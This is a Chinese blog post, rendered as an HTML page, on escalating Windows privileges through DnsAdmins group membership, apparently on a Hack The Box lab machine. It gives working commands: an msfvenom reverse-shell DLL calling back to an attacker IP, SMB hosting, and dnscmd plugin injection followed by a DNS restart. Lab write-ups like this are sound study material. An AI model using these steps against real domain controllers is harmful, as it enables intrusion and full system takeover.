@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Windows,DnsAdmins,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介 通过DnsAdmins用户组可写入恶意dll，重启dns服务器即可执行恶意dll。">
+<meta name="keywords" content="Windows,DnsAdmins">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows privilege escalate: DnsAdmins Group">
+<meta property="og:url" content="https://exexute.github.io/2020/06/07/windows-privilege-escalate-DnsAdmins-Group/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介 通过DnsAdmins用户组可写入恶意dll，重启dns服务器即可执行恶意dll。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2022-06-24T14:14:32.207Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows privilege escalate: DnsAdmins Group">
+<meta name="twitter:description" content="简介 通过DnsAdmins用户组可写入恶意dll，重启dns服务器即可执行恶意dll。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2020/06/07/windows-privilege-escalate-DnsAdmins-Group/">
+
+
+
+
+
+  <title>windows privilege escalate: DnsAdmins Group | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2020/06/07/windows-privilege-escalate-DnsAdmins-Group/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">windows privilege escalate: DnsAdmins Group</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-07T05:53:41+08:00">
+                2020-06-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全研究/" itemprop="url" rel="index">
+                    <span itemprop="name">安全研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介</p>
+<p>通过DnsAdmins用户组可写入恶意dll，重启dns服务器即可执行恶意dll。</p>
+<a id="more"></a>
+<h4 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h4><p>DnsAdmins用户组<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins" target="_blank" rel="noopener">官方介绍</a>，</p>
+<h4 id="查看用户所在的用户组"><a href="#查看用户所在的用户组" class="headerlink" title="查看用户所在的用户组"></a>查看用户所在的用户组</h4><ul>
+<li>1.输入<code>net user &lt;usernaame&gt; /domain</code>，查看 </li>
+<li>2.输入<code>whoami /groups</code>查看</li>
+</ul>
+<h5 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ net user yran /domain</span><br><span class="line">User name                    ryan</span><br><span class="line">Full Name                    Ryan Bertrand</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">'s comment</span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            6/6/2020 3:08:02 PM</span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string">Password changeable          6/7/2020 3:08:02 PM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   6/5/2020 10:16:17 AM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships</span></span><br><span class="line"><span class="string">Global Group memberships     *Domain Users         *Contractors</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br></pre></td></tr></table></figure>
+<p>用户所在的组为：Domain Users、Contractors</p>
+<h5 id="whomi-groups"><a href="#whomi-groups" class="headerlink" title="whomi /groups"></a>whomi /groups</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; whoami /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                            Attributes</span><br><span class="line">========================================== ================ ============================================== ===============================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group</span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</span><br></pre></td></tr></table></figure>
+<p>用户所在的组：Everyone、Users、Pre-Windows 2000 Compatible Access、Remote Management Users、NETWORK、Authenticated Users、This Organization、Contractors、DnsAdmins、NTLM Authentication</p>
+<p>从两条命令的输出发现，域用户组的数量不一致，<code>net user</code>可以查看到全局用户组<code>Domain   Users</code>，但未查询到本地用户组<code>DnsAdmins</code></p>
+<!--为什么会出现这种情况 ？
+
+两者有何区别？原理是什么？-->
+<h4 id="生成恶意DLL文件"><a href="#生成恶意DLL文件" class="headerlink" title="生成恶意DLL文件"></a>生成恶意DLL文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f dll &gt; privesc.dll</span><br></pre></td></tr></table></figure>
+<h4 id="传输dll文件到受害者机器"><a href="#传输dll文件到受害者机器" class="headerlink" title="传输dll文件到受害者机器"></a>传输dll文件到受害者机器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python smbserver.py &lt;shareName&gt; &lt;path/of/share&gt;</span><br></pre></td></tr></table></figure>
+<p>启动smb服务后，在本地使用smbclient尝试访问smb服务，查看是否可以成功访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -L &lt;target ip&gt; --no-pass</span><br></pre></td></tr></table></figure>
+<h4 id="注入dll文件提权"><a href="#注入dll文件提权" class="headerlink" title="注入dll文件提权"></a>注入dll文件提权</h4><p>修改配置</p>
+<p>查看主机名<code>hostname</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ dnscmd &lt;FQDN of DC or servername&gt; /config /serverlevelplugindll \\UNC_path</span><br><span class="line">eg:</span><br><span class="line">$ dnscmd testmachine.test.local /config /serverlevelplugindll \\<span class="number">192.168</span>.<span class="number">43.100</span>\share\privesc.dll</span><br></pre></td></tr></table></figure>
+<p>检查配置是否写入成功</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="built_in">Get-ItemProperty</span></span><br><span class="line">HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll</span><br></pre></td></tr></table></figure>
+<p>重启dns服务</p>
+<p>sc.exe后跟的servername需要加<code>\\</code>前缀</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sc.exe &lt;FQDN of DC&gt; stop dns</span><br><span class="line">$ sc.exe &lt;FQDN of DC&gt; start dns</span><br></pre></td></tr></table></figure>
+<h4 id="dnscmd"><a href="#dnscmd" class="headerlink" title="dnscmd"></a>dnscmd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd</span><br><span class="line"></span><br><span class="line">Usage: DnsCmd &lt;ServerName&gt; &lt;Command&gt; [&lt;Command Parameters&gt;]</span><br><span class="line"></span><br><span class="line">&lt;ServerName&gt;:</span><br><span class="line">  IP address or host name    -- remote or local DNS server</span><br><span class="line">  .                          -- DNS server on local machine</span><br><span class="line">&lt;Command&gt;:</span><br><span class="line">  /Info                      -- Get server information</span><br><span class="line">  /Config                    -- Reset server or zone configuration</span><br><span class="line">  /EnumZones                 -- Enumerate zones</span><br><span class="line">  /Statistics                -- Query/clear server statistics data</span><br><span class="line">  /ClearCache                -- Clear DNS server cache</span><br><span class="line">  /WriteBackFiles            -- Write back all zone or root-hint datafile(s)</span><br><span class="line">  /StartScavenging           -- Initiates server scavenging</span><br><span class="line">  /IpValidate                -- Validate remote DNS servers</span><br><span class="line">  /EnumKSPs                  -- Enumerate available key storage providers</span><br><span class="line">  /ResetListenAddresses      -- Set server IP address(es) to serve DNS requests</span><br><span class="line">  /ResetForwarders           -- Set DNS servers to forward recursive queries to</span><br><span class="line">  /ZoneInfo                  -- View zone information</span><br><span class="line">  /ZoneAdd                   -- Create a new zone on the DNS server</span><br><span class="line">  /ZoneDelete                -- Delete a zone from DNS server or DS</span><br><span class="line">  /ZonePause                 -- Pause a zone</span><br><span class="line">  /ZoneResume                -- Resume a zone</span><br><span class="line">  /ZoneReload                -- Reload zone from its database (file or DS)</span><br><span class="line">  /ZoneWriteBack             -- Write back zone to file</span><br><span class="line">  /ZoneRefresh               -- Force refresh of secondary zone from master</span><br><span class="line">  /ZoneUpdateFromDs          -- Update a DS integrated zone by data from DS</span><br><span class="line">  /ZonePrint                 -- Display all records in the zone</span><br><span class="line">  /ZoneResetType             -- Change zone type</span><br><span class="line">  /ZoneResetSecondaries      -- Reset secondary\notify information for a zone</span><br><span class="line">  /ZoneResetScavengeServers  -- Reset scavenging servers for a zone</span><br><span class="line">  /ZoneResetMasters          -- Reset secondary zone&apos;s master servers</span><br><span class="line">  /ZoneExport                -- Export a zone to file</span><br><span class="line">  /ZoneChangeDirectoryPartition -- Move a zone to another directory partition</span><br><span class="line">  /ZoneSeizeKeymasterRole    -- Seize the key master role for a zone</span><br><span class="line">  /ZoneTransferKeymasterRole -- Transfer the key master role for a zone</span><br><span class="line">  /ZoneEnumSKDs              -- Enumerate the signing key descriptors for a zone</span><br><span class="line">  /ZoneAddSKD                -- Create a new signing key descriptor for a zone</span><br><span class="line">  /ZoneDeleteSKD             -- Delete a signing key descriptor for a zone</span><br><span class="line">  /ZoneModifySKD             -- Modify a signing key descriptor for a zone</span><br><span class="line">  /ZoneValidateSigningParameters -- Validate DNSSEC online signing parameters for a zone</span><br><span class="line">  /ZoneSetSKDState           -- Set Active and/or Standby keys for a signing key descriptor for a zone</span><br><span class="line">  /ZoneGetSKDState           -- Retrieve dynamic state for a signing key descriptor for a zone</span><br><span class="line">  /ZonePerformKeyRollover    -- Trigger a key rollover in a signing key descriptor for a zone</span><br><span class="line">  /ZonePokeKeyRollover       -- Trigger a key rollover in a signing key descriptor for a zone</span><br><span class="line">  /ZoneSign                  -- Signs the zone using DNSSEC online signing parameters</span><br><span class="line">  /ZoneUnsign                -- Removes DNSSEC signatures from a signed zone</span><br><span class="line">  /ZoneResign                -- Regenerate DNSSEC signatures in a signed zone</span><br><span class="line">  /EnumRecords               -- Enumerate records at a name</span><br><span class="line">  /RecordAdd                 -- Create a record in zone or RootHints</span><br><span class="line">  /RecordDelete              -- Delete a record from zone, RootHints or cache</span><br><span class="line">  /NodeDelete                -- Delete all records at a name</span><br><span class="line">  /AgeAllRecords             -- Force aging on node(s) in zone</span><br><span class="line">  /TrustAnchorAdd            -- Create a new trust anchor zone on the DNS server</span><br><span class="line">  /TrustAnchorDelete         -- Delete a trust anchor zone from DNS server or DS</span><br><span class="line">  /EnumTrustAnchors          -- Display status information for trust anchors</span><br><span class="line">  /TrustAnchorsResetType     -- Change zone type for a trust anchor zone</span><br><span class="line">  /EnumDirectoryPartitions   -- Enumerate directory partitions</span><br><span class="line">  /DirectoryPartitionInfo    -- Get info on a directory partition</span><br><span class="line">  /CreateDirectoryPartition  -- Create a directory partition</span><br><span class="line">  /DeleteDirectoryPartition  -- Delete a directory partition</span><br><span class="line">  /EnlistDirectoryPartition  -- Add DNS server to partition replication scope</span><br><span class="line">  /UnenlistDirectoryPartition -- Remove DNS server from replication scope</span><br><span class="line">  /CreateBuiltinDirectoryPartitions -- Create built-in partitions</span><br><span class="line">  /ExportSettings            -- Output settings to DnsSettings.txt in the DNS server database directory</span><br><span class="line">  /OfflineSign               -- Offline signing zone files, including key generation/deletion</span><br><span class="line">  /EnumTrustPoints           -- Display active refresh information for all trust points</span><br><span class="line">  /ActiveRefreshAllTrustPoints -- Perform an active refresh on all trust points now</span><br><span class="line">  /RetrieveRootTrustAnchors  -- Retrieve root trust anchors via HTTPS</span><br><span class="line"></span><br><span class="line">&lt;Command Parameters&gt;:</span><br><span class="line">  DnsCmd &lt;CommandName&gt; /? -- For help info on specific Command</span><br><span class="line"></span><br><span class="line">In future versions of Windows, Microsoft might remove dnscmd.exe.</span><br><span class="line"></span><br><span class="line">If you currently use dnscmd.exe to configure and manage the DNS server,</span><br><span class="line">Microsoft recommends that you transition to Windows PowerShell.</span><br><span class="line"></span><br><span class="line">To view a list of commands for DNS server management, type</span><br><span class="line">&quot;Get-Command -Module DnsServer&quot; at the Windows PowerShell prompt. Additional</span><br><span class="line">information about Windows PowerShell commands for DNS is available at</span><br><span class="line">http://go.microsoft.com/fwlink/?LinkId=217627.</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Windows/" rel="tag"># Windows</a>
+          
+            <a href="/tags/DnsAdmins/" rel="tag"># DnsAdmins</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/23/HTB-Windows-Nest/" rel="next" title="HTB Windows Nest">
+                <i class="fa fa-chevron-left"></i> HTB Windows Nest
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/07/HTB-Windows-Resolute/" rel="prev" title="HTB-Windows-Resolute">
+                HTB-Windows-Resolute <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞产生的原因"><span class="nav-number">1.</span> <span class="nav-text">漏洞产生的原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看用户所在的用户组"><span class="nav-number">2.</span> <span class="nav-text">查看用户所在的用户组</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#net-user"><span class="nav-number">2.1.</span> <span class="nav-text">net user</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#whomi-groups"><span class="nav-number">2.2.</span> <span class="nav-text">whomi /groups</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#生成恶意DLL文件"><span class="nav-number">3.</span> <span class="nav-text">生成恶意DLL文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#传输dll文件到受害者机器"><span class="nav-number">4.</span> <span class="nav-text">传输dll文件到受害者机器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入dll文件提权"><span class="nav-number">5.</span> <span class="nav-text">注入dll文件提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dnscmd"><span class="nav-number">6.</span> <span class="nav-text">dnscmd</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
